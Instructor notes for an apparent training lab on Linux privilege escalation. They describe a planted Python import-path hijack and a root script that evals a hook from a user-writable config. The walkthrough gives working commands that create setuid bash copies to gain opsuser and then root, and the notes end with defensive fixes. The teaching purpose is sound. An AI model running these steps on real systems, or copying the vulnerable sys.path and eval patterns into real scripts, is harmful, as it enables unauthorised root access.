# Privilege escalation: instructor notes (Stage 10-14)

**Do not link this file from student-facing pages.** It is intended for
instructors verifying the lab and for a post-exercise debrief.

## Design: one strict path, three tiers, three distinct bug classes

Provisioned by `setup_privesc.sh` (run at container build time and by
`scripts/reset_lab.sh`). There is exactly one account at each tier and
exactly one way to move to the next one:

- **Low — `appuser`.** No group membership beyond its own, no interesting
  file access, and exactly **one** sudo grant:
  `appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/archive_worker.py *`.
  Nothing else. `appuser` cannot edit `archive_worker.py` (root-owned, not
  writable).
- **Mid — `opsuser`.** Has **no valid password at all** -- the account is
  locked in `/etc/shadow`. There is nothing to brute-force, guess, or find
  leaked anywhere: the *only* way to act as `opsuser` is the Hop 1 exploit
  below. `opsuser` in turn has exactly **one** sudo grant:
  `opsuser ALL=(root) NOPASSWD: /opt/shop/scripts/backup.sh`. `opsuser`
  cannot edit `backup.sh` either (root-owned, not writable) -- but *can*
  edit `backup.conf`, which is the actual Hop 2 bug.
- **High — root.** Reached only via the Hop 2 exploit below.

### Hop 1 — appuser -> opsuser: Python import-path hijack (CWE-427)

`archive_worker.py` (see its own docstring) is a plausible internal tool --
"archive processed images via a pluggable format handler, looked up by
name from a shared outbox directory" -- that does:

```python
sys.path.insert(0, OUTBOX_DIR)
module = __import__(handler_name)
```

`OUTBOX_DIR` (`/opt/shop/backups/outbox/`) is owned `appuser:appuser`, mode
755 -- world-readable so `opsuser`'s import can actually find files there,
but only `appuser` can write into it. Since `appuser` can invoke this
script *as opsuser* via the scoped sudo rule, and can plant any
same-named `.py` file into `OUTBOX_DIR` first, `appuser` fully controls
what `__import__(handler_name)` actually imports -- and that module's
top-level code runs as `opsuser`, because `sudo` performs the real UID
switch before `archive_worker.py` ever starts running.

### Hop 2 — opsuser -> root: config-driven hook injection

`backup.sh` is root-owned, mode `755` -- **not** writable by `opsuser` or
anyone but root. It also sources `/opt/shop/scripts/backup.conf`, which
**is** owned by `opsuser` (mode 644) -- a deliberately ordinary "ops
configures their own notification hook" file. If that config sets
`POST_BACKUP_HOOK`, `backup.sh` runs it with `eval`, as root, completely
unvalidated. A scoped sudo rule and a non-editable script are not enough
on their own when the privileged script trusts a lower-privileged
account's *configuration*.

## Expected student path

**Hop 1**, from an `appuser` shell (after Stage 9):
1. `id` -- an ordinary, unprivileged account; no interesting group.
2. `sudo -l` -- shows exactly one rule: `(opsuser) NOPASSWD:
   /opt/shop/scripts/archive_worker.py *`. This is the only lead.
3. `cat /opt/shop/scripts/archive_worker.py` (world-readable) -- see it
   inserts an appuser-writable directory at the *front* of `sys.path`
   before importing a handler module by name. Recognize CWE-427.
4. Plant a malicious handler:
   ```bash
   cat > /opt/shop/backups/outbox/evil.py <<'EOF'
   import os
   os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
   EOF
   ```
5. `sudo -u opsuser /opt/shop/scripts/archive_worker.py evil`
6. `cat /opt/shop/flags/stage2` -- fails as appuser (not world-readable);
   confirms the hop by using the mechanism itself, e.g. append
   `os.system("cat /opt/shop/flags/stage2 > /tmp/stage2_proof.txt")` to
   `evil.py` before running step 5, or use the setuid shell from step 4.

**Hop 2**, from an `opsuser`-privileged shell (e.g. via the setuid helper
from Hop 1, or any command run directly by the malicious handler module
while it's genuinely `opsuser`):
7. `sudo -l` -- shows exactly one rule: `(root) NOPASSWD:
   /opt/shop/scripts/backup.sh`.
8. `ls -la /opt/shop/scripts/backup.sh` -- `root:root`, mode `755`, not
   writable. Editing it directly is not an option.
9. `cat /opt/shop/scripts/backup.sh` (world-readable) -- see it sources
   `backup.conf` and `eval`s a `POST_BACKUP_HOOK` from it.
10. `ls -la /opt/shop/scripts/backup.conf` -- owned `opsuser`, writable.
    Set the hook:
    ```bash
    echo 'POST_BACKUP_HOOK="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' \
      >> /opt/shop/scripts/backup.conf
    sudo /opt/shop/scripts/backup.sh
    /tmp/rootbash -p
    ```
11. Read `/root/final_flag`.

As with the previous design, note that a setuid copy of a shell only ever
carries an *effective* identity forward for a non-root target account --
Hop 1's payload should perform (or stage) whatever it needs while it is
genuinely `opsuser` (both real and effective UID, which only holds for
the lifetime of the one `sudo -u opsuser` invocation), rather than relying
on a later, separate invocation of a planted setuid binary to pass Hop 2's
own `sudo` check.

## Why this is a good training vulnerability

- Deterministic and 100% reproducible after `reset_lab.sh` -- no reliance
  on a kernel version, timing, or an unpatched CVE.
- Three genuinely different bug classes across the full chain, each
  requiring a different skill: OS command injection into a shell string
  (Stage 9, entry), Python import search-path manipulation (Hop 1), and
  untrusted-configuration-drives-privileged-execution (Hop 2) -- a
  student can't reuse the same intuition three times.
- Not `ALL=(ALL) NOPASSWD:ALL` anywhere -- both sudo rules are narrowly
  scoped to exactly one script each, which is exactly why the deeper bug
  in each script needs to be found: a scoped sudo rule is NOT
  automatically safe just because the invoking account can't edit the
  target script -- it can still trust something *else* the lower-privileged
  account controls (a search path, a config file).
- **Exactly one path exists at every tier.** Each account has exactly one
  sudo grant, each targeted script has exactly one exploitable bug, and
  neither script nor any writable directory/config file is reachable by
  an account that hasn't already completed the prior hop. There is no
  group membership, no leaked credential, and no alternate technique that
  shortcuts either hop -- `tests/test_privilege_escalation.py` asserts the
  single-sudo-rule and non-writable-script properties for both hops, and
  `opsuser` having no valid password at all rules out any password-based
  route into that account.

## Defensive fix

- Never insert an attacker-influenceable directory into `sys.path` (or any
  other module search path) before an import. If pluggable handlers are a
  real requirement, resolve them from a fixed, root-owned registry, not a
  writable drop directory.
- Never let a privileged script `source`/`eval` a configuration file
  writable by a less-privileged account without treating that as exactly
  as dangerous as giving that account the sudo rule directly. If per-user
  hooks are genuinely needed, validate and allowlist them, or run the hook
  itself at the lower privilege level, not as root.
- Prefer dedicated service accounts with no interactive login and no sudo
  rights of their own, triggered by a systemd timer instead of a
  human/application-invoked sudo rule, for anything resembling either of
  these two scripts in a real deployment.
